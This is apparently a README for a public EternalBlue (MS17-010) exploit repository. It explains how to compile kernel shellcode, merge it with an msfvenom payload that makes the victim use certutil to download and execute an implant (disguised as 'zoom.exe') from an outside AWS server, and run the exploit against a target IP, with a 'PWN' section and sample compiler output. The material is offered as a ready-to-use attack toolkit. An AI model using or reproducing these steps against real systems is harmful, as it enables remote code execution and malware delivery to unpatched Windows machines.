# MS17-010 Exploit Code

This is some  public exploit code that generates valid shellcode for the eternal blue exploit that instructs the victim using Certutil tool to download an implant from an internet AWS server and execute it.

This version of the exploit is prepared in a way where you can exploit eternal blue WITHOUT metasploit, or reverse shells (no need to use ncat listenning)

This allows for this version of the MS17-010 exploit to be a bit more flexible, and also fully functional, as many exploits leave out the steps to compile the kernel shellcode that usually comes with it.

Included is also an enternal blue checker script that allows you to test if your target is potentially vulnerable to MS17-010

run `python eternal_checker.py <TARGET-IP>`


# Requirements
Core exploit code requires impacket and the `mysmb.py` library (included with the repo). To install any requirements simply use pip on the `requirements.txt` file. It's always recommended you use a virtual environment like `venv` when installing python dependencies, but use whatever you like.

Additionally, the helper scripts below require the Metasploit Framework to be installed. At minimum you will need `msfvenom` for the `shell_prep.sh` but stageless command shells can be caught like any normal command shell without the use of Metasploit's multi/handler. Otherwise, simply install the metasploit framework and insure it is in your path.

#### IMPORTANT SUPPORT INFO:
Keep in mind `python2` is *not* officially supported anymore. The original exploit code that is provided was initially built for python2, going forward any errors discovered will be adjusted for insuring the code works with python3 instead of python2. Instructions below assume python/pip are `python3` by default, so if you are using `python2` update based on your own paths when necessary and remember, it is *NOT* officially supported by this repo.
## Python2
`pip2.7 install -r requirements.txt`

## Python3
`pip install -r requirements.txt`

## TODO:
- [x] Validate python3 compatibility
- [ ] Testing with non-msfvenom shellcode

## VIDEO TUTORIALS:
- https://www.youtube.com/watch?v=p9OnxS1oDc0
- https://youtu.be/2FwqryKUoX8


## USAGE:
Navigate to the `shellcode` directory in the repo:

run ./shell_prep.sh

OUTPUT:
```
                 _.-;;-._
          '-..-'|   ||   |
          '-..-'|_.-;;-._|
          '-..-'|   ||   |
          '-..-'|_.-''-._|   
Eternal Blue Windows Shellcode Compiler

Let's compile them windoos shellcodezzz

Compiling x64 kernel shellcode
'Compiling x86 kernel shellcode'
kernel shellcode compiled
Generating payload to download and execute zoom.exe using certutil...
Running the 'init' command for the database:
Existing database found, attempting to start it
Starting database at /home/nicolas/.msf4/db...pg_ctl: another server might be running; trying to start server anyway
server starting
success
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 364 bytes
Saved as: sc_x64_msf.bin
Payload for x64 generated.
MERGING KERNEL SHELLCODE WITH MSFVENOM-GENERATED PAYLOAD!
Shellcode merged successfully.
DONE
```

## PWN:
If you have completed the USAGE steps, now you're ready to PWN the target.

navigate back to Eternal-Blue-with-RCE directory

run: `python3 eternalblue_exploit10.py <TARGET-IP> shellcode/sc_x64.bin <Number of Groom Connections (optional)>`



